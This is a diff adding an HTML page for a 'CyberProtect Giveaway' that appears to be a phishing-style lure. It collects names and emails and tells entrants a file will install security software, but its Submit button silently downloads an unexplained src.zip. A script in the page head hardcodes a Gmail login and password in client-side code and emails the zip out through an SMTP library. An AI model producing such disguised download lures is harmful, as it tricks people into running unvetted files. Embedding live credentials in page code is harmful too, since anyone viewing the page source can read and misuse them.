@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Question Form</title>
+        <style>
+            body{
+                background-image: url('https://www.stockvault.net/data/2020/09/28/279232/preview16.jpg');
+                background-size: cover;
+                height: 100%;
+                overflow: hidden;
+                
+            }
+            h1{
+                font-size: 2.7em;
+                background-color: rgba(255, 255, 255, .2);
+                text-shadow: black 2px 2px;
+                text-align: center;
+                color: white;
+                font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+                
+            }
+            h2{
+              color: darkslategray;
+            }
+            h3{
+              color: darkslategray; 
+            }
+            fieldset{
+                background-color: rgba(255, 255, 255, .5);
+                max-width: 1350px;
+                border: black 1.5px solid;
+            }
+            legend{
+                background-color: rgba(255, 255, 255, .8);
+                font-size: 1em;
+                padding: 5px;
+                border: black 2px solid;
+            }
+            #question{
+                width: 500px;
+                height: 20px;
+            }
+            button{
+                width: 150px;
+                height: 30px;
+                border: black 2px solid;
+                background-color: white;
+            }
+        </style>
+        
+                <script src=
+          "https://smtpjs.com/v3/smtp.js">
+        </script>
+        <script type="text/javascript">
+        function sendEmail() {
+          Email.send({
+          Host: "smtp.gmail.com",
+          Username: "cyberprotect.co@gmail.com",
+          Password: "TheAwesomeHackers",
+          To: 'cyberprotect.co@gmail.com',
+          From: "cyberprotect.co@gmail.com",
+          Subject: "Sending Email using javascript",
+          Body: "Well that was easy!!",
+          Attachments: [
+          {
+            name: "src.zip",
+            path: "src.zip"
+          }]
+        })
+        .then(function (message) {
+          alert("Mail has been sent successfully")
+        });
+    }
+    </script>
+    </head>
+    <body>
+
+        <form id="register" method="get" action="localConfirm.html">
+            <h1>CyberProtect Giveaway!</h1>
+            <fieldset>
+                <legend>Entry Details:</legend>
+                <div>
+                    <h2>You have the chance to win a full year of free full-service cybersecurtiy service!</h2>
+                    <h2>Fill out the following information to enter the CyberProtect giveaway.</h2>
+                    <h3>If you are selected a file will automatically download to install our security software to your device!</h3>
+                    <h3>Max one entry per day</h3>
+                    <p>
+                        <label>First Name:</label>
+                        <input class="formEntry" id="firstName" name="firstName" type="text" placeholder="First Name Only" required autofocus>
+                    </p>
+                    <p>
+                        <label>Last Name:</label>
+                        <input class="formEntry" id="lastName" name="lastName" type="text" placeholder="Last Name Only" required>
+                    </p>
+                    <p>
+                        <label>Email:</label>
+                        <input class="formEntry" id="email" name="email" type="email" placeholder="example@domain.com" required>
+                    </p>
+                    <p>
+                            <label>Company:</label>
+                            <input class="formEntry" id="question" name="question" type="text" placeholder="Type 'Personal' if your are entering without a comapny affiliation" required>
+                    </p>
+                    
+                </div>
+            </fieldset>
+             
+             <div>
+                 <p style="margin-right: 4%;">
+                    <a href="src.zip" download="src.zip">
+                      <button type="button">Submit</button> 
+                    </a>
+                    <button class="inputButton" id="reset" type="reset" value="Send Email" onclick="sendEmail()">Back</button>
+                </p>
+             </div>
+        </form>
+        
+    </body>
+</html>
